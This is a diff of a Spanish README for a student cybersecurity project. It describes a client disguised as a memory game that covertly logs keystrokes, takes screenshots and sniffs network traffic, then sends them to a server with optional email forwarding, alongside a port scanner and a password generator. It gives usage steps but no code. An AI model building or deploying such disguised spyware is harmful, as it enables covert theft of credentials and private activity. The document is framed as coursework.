@@ -1,194 +1,195 @@
-# 🔐 Proyecto Keylogger - Ciberseguridad
+# 🔐 Proyecto de Hacking Ético - Ciberseguridad
 
-> **⚠️ AVISO:** Este proyecto es exclusivamente para fines **educativos** dentro de la materia de Ciberseguridad. El uso indebido de herramientas de keylogging sin consentimiento es **ilegal**.
+> **⚠️ AVISO:** Proyecto exclusivamente **educativo**. El uso indebido sin consentimiento es **ilegal**.
 
 ## 📋 Descripción
 
-Aplicación de keylogger con arquitectura **cliente-servidor** desarrollada en Python. El cliente (máquina "víctima") captura teclas y screenshots, enviándolos al servidor para su almacenamiento y análisis.
+Aplicación de hacking ético con arquitectura **cliente-servidor** que integra 4 módulos:
 
-## 🏗️ Arquitectura
+| # | Módulo | Descripción |
+|---|--------|-------------|
+| 1 | **Escaneo de Puertos** | Escanea puertos lógicos abiertos de un PC remoto |
+| 2 | **Generador de Contraseñas** | Genera contraseñas seguras de X longitud |
+| 3 | **Sniffing de Red** | Captura tráfico de red y lo envía al servidor |
+| 4 | **Keylogger** | Captura teclas + screenshots y los envía al servidor |
+
+## 🏗️ Arquitectura (3 Máquinas)
 
 ```
-┌─────────────────────┐         TCP/IP          ┌─────────────────────┐
-│   CLIENTE (Víctima)  │ ─────────────────────▶ │    SERVIDOR          │
-│                     │                         │                     │
-│  • Captura teclas   │   Protocolo JSON+Payload│  • Recibe datos     │
-│  • Toma screenshots │ ──────────────────────▶ │  • Guarda logs .txt │
-│  • Log local backup │                         │  • Guarda screenshots│
-│                     │                         │  • Envía emails 📧  │
-└─────────────────────┘                         └─────────────────────┘
-```
-
-### Protocolo de Comunicación
-
-El cliente envía mensajes con un **header JSON** seguido del **payload**:
-
-```json
-{"type": "keys", "size": 45}
-<45 bytes de texto de teclas>
-
-{"type": "screenshot", "size": 184320, "filename": "screenshot_20260304_200000.png"}
-<184320 bytes de imagen PNG>
+┌─────────────────────────┐                    ┌─────────────────────────┐
+│   CLIENTE 1 (Víctima)   │     TCP/9999       │                         │
+│                         │ ──────────────────▶ │    SERVIDOR             │
+│  • Juego de Memorama    │                    │                         │
+│  • Keylogger oculto     │                    │  • Recibe teclas        │
+│  • Screenshots          │                    │  • Recibe screenshots   │
+│  • Sniffer de red       │                    │  • Recibe sniffing      │
+└─────────────────────────┘                    │  • Escáner de puertos   │
+                                               │  • Generador passwords  │
+┌─────────────────────────┐                    │  • GUI con 4 pestañas   │
+│   CLIENTE 2 (Víctima)   │     TCP/9999       │                         │
+│                         │ ──────────────────▶ │                         │
+│  (Mismo que Cliente 1)  │                    └─────────────────────────┘
+└─────────────────────────┘
 ```
 
 ## 📦 Requisitos
 
-- Python 3.8+
-- Linux (ambas máquinas)
-- Conexión de red entre servidor y cliente
+- **Python 3.8+**
+- **Linux** (todas las máquinas)
+- **Red LAN** entre las 3 máquinas
 
-### Dependencias de Python
+### Dependencias
 
-| Paquete   | Uso                      | Instalación         |
-|-----------|--------------------------|---------------------|
-| `pynput`  | Captura de teclas        | Solo en el cliente  |
-| `Pillow`  | Capturas de pantalla     | Solo en el cliente  |
+| Paquete | Uso | Dónde |
+|---------|-----|-------|
+| `evdev` | Captura de teclas | Cliente |
+| `Pillow` | Screenshots | Cliente |
+| `scapy` | Sniffing de red | Cliente |
 
-## 🚀 Instalación
+> El servidor solo usa la librería estándar de Python.
 
-### 1. Clonar/Copiar el proyecto en ambas máquinas
+---
+
+## 🚀 GUÍA DE USO PASO A PASO
+
+### Paso 0: Preparar el Entorno
+
+En **las 3 máquinas**, asegúrate de tener Python 3:
 
 ```bash
-# En ambas máquinas
-cd ~/Workspace/Keylog
+python3 --version
 ```
 
-### 2. Instalar dependencias (solo en el CLIENTE)
+### Paso 1: Configurar el SERVIDOR (Máquina 1)
 
+1. **Copiar el proyecto** a la máquina servidor:
 ```bash
+# Copiar la carpeta Keylog al servidor
+scp -r Keylog/ usuario@IP_SERVIDOR:~/
+```
+
+2. **Ejecutar el servidor**:
+```bash
+cd ~/Keylog
+python3 server.py
+```
+
+3. Se abre la **GUI con 4 pestañas**:
+   - ⌨ **Keylogger**: Muestra teclas y screenshots recibidos en tiempo real
+   - 🔍 **Port Scanner**: Escanear puertos de cualquier IP
+   - 🔑 **Password Gen**: Generar contraseñas seguras
+   - 📡 **Sniffer**: Ver tráfico de red capturado por los clientes
+
+4. **Hacer clic en "▶ INICIAR"** para arrancar el servidor TCP
+
+5. **Anotar la IP** que aparece (ej: `192.168.1.100`) — los clientes la necesitan
+
+### Paso 2: Configurar CLIENTES (Máquinas 2 y 3)
+
+1. **Copiar el proyecto** a cada máquina cliente:
+```bash
+scp -r Keylog/ usuario@IP_CLIENTE:~/
+```
+
+2. **Instalar dependencias** en cada cliente:
+```bash
+cd ~/Keylog
 pip install -r requirements.txt
 ```
 
-> **Nota:** El servidor solo usa la librería estándar de Python, no necesita instalar dependencias adicionales.
-
-## ⚙️ Uso
-
-### Paso 1: Iniciar el Servidor
-
-En la máquina **servidor**, ejecutar:
-
+3. **Ejecutar el cliente** (requiere sudo para evdev y scapy):
 ```bash
-# Uso básico (escucha en 0.0.0.0:9999)
-python3 server.py
-
-# Especificar puerto
-python3 server.py --port 8888
-
-# Con envío de emails activado
-python3 server.py --email --smtp-user micorreo@gmail.com --smtp-pass "mi_app_password" --email-to destino@gmail.com
+sudo python3 client.py
 ```
 
-**Opciones del servidor:**
+4. Aparece el **juego de Memorama**. En el campo "Clave de acceso":
+   - **Escribir la IP del servidor** (ej: `192.168.1.100`)
+   - Hacer clic en **"🎮 JUGAR"**
 
-| Argumento      | Descripción                              | Default     |
-|----------------|------------------------------------------|-------------|
-| `--host`       | IP para escuchar                         | `0.0.0.0`   |
-| `--port`, `-p` | Puerto TCP                               | `9999`      |
-| `--email`      | Activar envío de screenshots por email   | Desactivado |
-| `--smtp-user`  | Correo para envío SMTP                   | —           |
-| `--smtp-pass`  | App Password de Gmail                    | —           |
-| `--email-to`   | Correo destino                           | —           |
+5. El juego inicia normalmente. En segundo plano se ejecutan:
+   - **Keylogger**: captura todas las teclas
+   - **Screenshots**: captura pantalla cada 60 segundos
+   - **Sniffer**: captura el tráfico de red
 
-### Paso 2: Iniciar el Cliente
+### Paso 3: Usar el Escáner de Puertos (en el Servidor)
 
-En la máquina **cliente** (víctima), ejecutar:
+1. Ir a la pestaña **🔍 Port Scanner**
+2. Escribir la **IP objetivo** (puede ser la de un cliente)
+3. Definir rango (ej: 1-1024 para puertos conocidos)
+4. Clic en **"🔍 Escanear"**
+5. Los puertos abiertos aparecen en verde
 
-```bash
-# Uso básico (conecta a 127.0.0.1:9999)
-python3 client.py --host <IP_DEL_SERVIDOR>
+### Paso 4: Usar el Generador de Contraseñas (en el Servidor)
 
-# Con intervalo de screenshots personalizado (cada 30 segundos)
-python3 client.py --host 192.168.1.100 --interval 30
+1. Ir a la pestaña **🔑 Password Gen**
+2. Configurar:
+   - **Longitud** (ej: 16, 24, 32)
+   - **Tipos**: Mayúsculas, minúsculas, números, especiales
+   - **Cantidad** de contraseñas a generar
+3. Clic en **"🔑 Generar"**
 
-# Especificar archivo de log local
-python3 client.py --host 192.168.1.100 --log mi_log.txt
-```
+### Paso 5: Monitorear (en el Servidor)
 
-**Opciones del cliente:**
-
-| Argumento         | Descripción                              | Default        |
-|-------------------|------------------------------------------|----------------|
-| `--host`          | IP del servidor                          | `127.0.0.1`    |
-| `--port`, `-p`    | Puerto del servidor                      | `9999`         |
-| `--interval`, `-i`| Segundos entre screenshots               | `60`           |
-| `--log`           | Archivo de log local                     | `local_log.txt`|
-
-### Paso 3: Detener
-
-Presionar `Ctrl+C` en cualquiera de los dos programas para detenerlos.
-
-## 📧 Configuración de Email (Gmail)
-
-Para enviar capturas por correo usando Gmail:
-
-1. **Activar verificación en 2 pasos** en tu cuenta de Google
-2. Ir a [Contraseñas de aplicación](https://myaccount.google.com/apppasswords)
-3. Generar una **App Password** para "Correo"
-4. Usar esa contraseña con el flag `--smtp-pass`
-
-```bash
-python3 server.py --email \
-  --smtp-user tucorreo@gmail.com \
-  --smtp-pass "abcd efgh ijkl mnop" \
-  --email-to destino@gmail.com
-```
-
-## 📁 Estructura de Archivos Generados
+- **Pestaña Keylogger**: ver teclas en tiempo real
+- **Pestaña Sniffer**: ver tráfico de red capturado
+- Los archivos se guardan automáticamente:
 
 ```
 Keylog/
-├── server.py              # Código del servidor
-├── client.py              # Código del cliente
-├── requirements.txt       # Dependencias pip
-├── README.md              # Esta documentación
-│
-├── logs/                  # (Servidor) Logs de teclas capturadas
-│   └── keylog_192.168.1.50_2026-03-04_20-00-00.txt
-│
-├── screenshots/           # (Servidor) Screenshots recibidos
-│   └── screenshot_20260304_200100.png
-│
-├── local_log.txt          # (Cliente) Log local de respaldo
-│
-└── local_screenshots/     # (Cliente) Screenshots si no hay conexión
-    └── screenshot_20260304_200100.png
+├── server.py
+├── client.py
+├── requirements.txt
+├── logs/                    ← Teclas capturadas (.txt)
+│   └── keylog_192.168.1.50_2026-04-30_20-00-00.txt
+├── screenshots/             ← Capturas de pantalla (.png)
+│   └── screenshot_20260430_200100.png
+└── sniff_captures/          ← Tráfico de red (.txt)
+    └── sniff_20260430_200200.txt
 ```
 
-### Formato del Archivo de Log (.txt)
+---
 
+## 📧 Configuración de Email (Opcional)
+
+Para enviar capturas por correo, crear un archivo `.env`:
+
+```bash
+# .env
+EMAIL_USER=tucorreo@gmail.com
+EMAIL_PASS=tu_app_password
+EMAIL_TO=destino@gmail.com
 ```
-=== Sesión iniciada: 2026-03-04_20-00-00 ===
-=== Cliente: 192.168.1.50 ===
 
-[20:00:05] Hola[SPACE]mundo[ENTER]
-[20:00:12] [CTRL]c
-[20:01:30] usuario[TAB]contraseña[ENTER]
+## 🔧 Protocolo de Comunicación
 
-=== Sesión finalizada: 2026-03-04 20:30:00 ===
+Mensajes JSON header + payload binario:
+
+```json
+{"type": "keys", "size": 45}
+<45 bytes de teclas>
+
+{"type": "screenshot", "size": 184320, "filename": "screenshot_20260430.png"}
+<184320 bytes PNG>
+
+{"type": "sniff", "size": 1024, "filename": "sniff_20260430.txt"}
+<1024 bytes de tráfico capturado>
 ```
 
-## 🔧 Características Técnicas
-
-- **Multihilo:** El servidor acepta múltiples clientes simultáneamente
-- **Reconexión automática:** El cliente reintenta la conexión con backoff exponencial
-- **Modo offline:** El cliente guarda datos localmente si pierde conexión
-- **Thread-safe:** Buffer de teclas protegido con locks
-- **Log local:** Respaldo en el cliente por si se pierde la conexión
-
-## ⚠️ Consideraciones Éticas y Legales
+## ⚠️ Consideraciones Éticas
 
 1. **Solo para fines educativos** en ambientes controlados
-2. **Nunca instalar** en equipos sin el consentimiento explícito del propietario
-3. El uso no autorizado de keyloggers es un **delito** penado por la ley
-4. Este proyecto demuestra conceptos de ciberseguridad para aprender a **defender** sistemas, no para atacarlos
+2. **Nunca instalar** sin consentimiento explícito del propietario
+3. El uso no autorizado es un **delito** penado por la ley
+4. Demuestra conceptos para aprender a **defender** sistemas
 
 ## 👥 Integrantes
 
 | Nombre | Rol |
 |--------|-----|
-| —      | Servidor |
-| —      | Cliente  |
+| — | Servidor |
+| — | Cliente 1 |
+| — | Cliente 2 |
 
 ## 🎓 Materia
 
-**Ciberseguridad** — Proyecto de keylogger cliente-servidor
+**Ciberseguridad** — Proyecto de Hacking Ético
